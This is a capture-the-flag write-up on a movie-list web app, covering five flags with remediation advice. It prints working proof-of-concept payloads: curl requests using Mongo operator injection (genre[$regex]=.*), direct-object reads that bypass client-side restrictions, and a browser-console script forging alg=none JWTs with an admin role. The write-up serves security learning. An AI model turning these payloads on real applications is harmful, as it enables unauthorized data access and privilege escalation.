# CTF Report — “My Movie List” (HXT)

**Author:** Red Asgard (Seasoned Security Engineer)  
**Date:** 2025‑09‑01  
**Target:** moviedb‑ng72226a2snhq.hexbirch.com  

> *We pried open the marquee, slipped past the velvet rope, and asked the backend what secrets it whispers after hours. It answered. This is the ledger of those answers.*

---

## Executive Summary
We identified five distinct vulnerabilities leading to five flags across frontend and backend surfaces. Issues include a hidden debug route, unauthenticated flag exposure, client‑side access control for restricted content, NoSQL injection in query parameters, and a JWT signature verification bypass (alg=none). Together, they demonstrate systemic trust-in-client antipatterns and insufficient input validation.

**Captured Flags**
- **Flag A — Frontend/Hidden Route:** `HXT{redacted}`
- **Flag B — Backend (Unauthenticated):** *(value captured; omitted)*
- **Flag C — Logic/BOLA (Wrong‑Genre Access):** *(value captured; omitted)*
- **Flag D — NoSQL Injection:** `HXT{redacted}`
- **Flag E — JWT None Bypass:** `HXT{redacted}`

> Note: Two flag strings are intentionally not reprinted here; retainers have them recorded from live exploitation.

---

## Scope & Method
- **In‑scope:** Public web app, associated REST endpoints (`/api/*`), client bundle (`/assets/index‑e656227f.js`).
- **Methods:** Static bundle review, runtime observation via DevTools, parameter tampering, enumeration, crafted JWTs, and injection testing against common Node/Mongoose patterns.

---

## Findings

### F‑01: Hidden Test Route Leaks Flag (Frontend Cipher)
**Severity:** Low (Information Exposure → direct flag)  
**Endpoint:** `/testing`  
**Mechanism:** The bundle exposes a route rendering an encoded string via a custom alphabet Caesar‑like shift (`+42`). Decoding yields the flag.

**Evidence (from bundle):**
- Alphabet: `abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.!~*'(){},:;@&=+$#?/[]`
- Render logic: `t("brn3-MKZM_uZMIK_uZW._MuIP,@-R4", 42)` → **`HXT{redacted}`**

**Impact:** Direct disclosure of a flag. Demonstrates presence of test/UX routes in production.

**Remediation:** Strip test routes in production; gate internal pages behind robust auth; add automated bundle scanning for `testing`, `debug`, or cipher utilities.

---

### F‑02: Backend Flag Exposed Without Authentication
**Severity:** High (Unauthenticated Sensitive Data Exposure)  
**Endpoint:** `GET /api/backend-flag`  
**Mechanism:** Endpoint returns JSON containing a flag for unauthenticated callers.

**PoC:**
```bash
curl -s 'https://<host>/api/backend-flag'
```
**Impact:** Direct disclosure to any user; trivially collectible by crawlers.

**Remediation:** Require authentication and authorization, return least data by default, add deny‑by‑default middleware for `/api/*`.

---

### F‑03: Client‑Side “18+” Restriction Bypass → Wrong‑Genre Object Read (BOLA)
**Severity:** High (Access Control/Authorization Bypass)  
**Endpoint:** `GET /api/movie?genre=<slug>&movie_id=<id>`; UI route `/<genre>/<movieId>`  
**Mechanism:** Genre restrictions enforce only in the client. Supplying a **restricted movie’s** ObjectId under an **unrestricted** genre returns details and a flag.

**Examples:**
- Using predicted/observed ObjectId **`6444dbc9756272cc8b647de2`** (listed as *The Flag I*), fetch via an unrestricted path, e.g. `/comedy/<id>` or `genre=comedy` in the API. Flag is returned.

**Impact:** Broken Object Level Authorization (BOLA). Any restricted asset can be read by cross‑wiring route parameters.

**Remediation:** Server‑side authorization checks must validate that `movie_id` belongs to `genre`, and that the caller has rights to the genre’s content. Reject mismatches.

---

### F‑04: NoSQL Injection in `genre` Query Parameter → Full Enumeration & Flag
**Severity:** Critical (Injection → Data Exposure)  
**Endpoint:** `GET /api/movies?genre=<value>`  
**Mechanism:** The API accepts raw Mongo operators; `genre[$regex]=.*` causes an unrestricted match, returning all movies including “The Flag II.”

**PoC:**
```bash
curl -s 'https://<host>/api/movies?genre[$regex]=.*' | jq .
# locate ID for The Flag II → 61ba25cbfe687fce2f042415
curl -s 'https://<host>/api/movie?genre=comedy&movie_id=61ba25cbfe687fce2f042415' | jq .
# → flag: HXT{redacted}
```

**Impact:** Full data enumeration and subsequent direct object access.

**Remediation:**
- Sanitize payloads (`express-mongo-sanitize`, JOI/Zod schema validation).  
- Whitelist `genre` against an allowed set; reject objects/regex types.  
- Use parameterized server‑side queries with strict type checks and explicit filters.

---

### F‑05: JWT Signature Verification Bypass (alg=none) → Role Manipulation
**Severity:** Critical (AuthN/AuthZ Compromise)  
**Endpoints:** `POST /api/login`, `GET /api/user`  
**Mechanism:** Backend trusts unsigned JWTs when `alg: none`. Forging a token with elevated claims surfaces a flag in `role`.

**PoC:**
```js
// in browser console
const b64u = s => btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const h = b64u(JSON.stringify({alg:'none',typ:'JWT'}));
const p = b64u(JSON.stringify({username:'admin',role:'admin',iat:Math.floor(Date.now()/1000)}));
const tok = `${h}.${p}.`;
localStorage.setItem('token', tok);
fetch('/api/user',{headers:{Authorization:`Bearer ${tok}`}}).then(r=>r.json()).then(console.log);
// → role contains flag: HXT{redacted}
```

**Impact:** Full privilege escalation; all authz predicated on JWT integrity is void.

**Remediation:**
- **Never** accept `alg=none`. Pin expected algorithm (e.g., `RS256`) and verify signature against server‑held keys.
- Validate `iss`, `aud`, `exp`, `nbf`; short TTL; key rotation; refuse unsigned/weak algs.

---

## Root Causes & Patterns
- Trusting the client for authorization (UI‑only “18+” checks).
- Lack of strong input validation and sanitization for query parameters (NoSQL operator injection).
- Insecure JWT handling (accepting `alg=none`).
- Residual debug/test surfaces in production (`/testing`, backend flag probe).

---

## Recommended Hardening Plan
1. **AuthZ at the API Layer**: Enforce genre‑to‑object consistency and role checks server‑side; deny on mismatch.  
2. **Sanitize & Validate**: Reject object/regex types for scalar params; strict schemas (JOI/Zod) for every endpoint; apply `express‑mongo‑sanitize`.  
3. **JWT Hygiene**: Enforce signature verification with pinned alg; centralized JWT middleware; add claim validation and revoke/rotate keys.  
4. **Remove Debug Surfaces**: Eliminate `/testing` and `/api/backend-flag` (or fully gate under admin + VPN).  
5. **Error & Logging Policy**: Generic user errors; structured server logs; no sensitive data in responses.  
6. **Defense in Depth**: WAF rules for Mongo operators in query strings, rate limiting, and security headers (CSP, Referrer‑Policy, etc.).

---

## Artifact Trail (Repro)
```bash
# F‑01: Hidden route → frontend flag
open https://<host>/testing

# F‑02: Unauth backend flag
override='curl -s https://<host>/api/backend-flag | jq .'

# F‑03: Wrong‑genre access (BOLA)
curl -s 'https://<host>/api/movie?genre=comedy&movie_id=6444dbc9756272cc8b647de2' | jq .

# F‑04: NoSQL injection → list + detail
curl -s 'https://<host>/api/movies?genre[$regex]=.*' | jq .
curl -s 'https://<host>/api/movie?genre=comedy&movie_id=61ba25cbfe687fce2f042415' | jq .

# F‑05: JWT none bypass → role flag (browser console)
(function(){const b=s=>btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const h=b(JSON.stringify({alg:'none',typ:'JWT'}));
const p=b(JSON.stringify({username:'admin',role:'admin',iat:Math.floor(Date.now()/1000)}));
localStorage.setItem('token', `${h}.${p}.`);})();
fetch('/api/user',{headers:{Authorization:`Bearer ${localStorage.getItem('token')}`}}).then(r=>r.json()).then(console.log)
```

---

## Appendix A — Decoder (for `/testing`)
```js
const ALPH = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.!~*'(){},:;@&=+$#?/[]";
const shift = (s,k)=>[...s].map(ch=>{const i=ALPH.indexOf(ch);if(i<0)return ch;let j=(i+k)%ALPH.length; if(j<0) j+=ALPH.length; return ALPH[j]}).join('');
// decode the page string by shifting -42
console.log(shift('brn3-MKZM_uZMIK_uZW._MuIP,@-R4', -42));
```

> *The projector’s off, the reels are still. The building sleeps. But the audit remains, etched in the logfiles and the flags we claimed. Lock the doors. Post a guard. And never trust the audience to run the theater.*

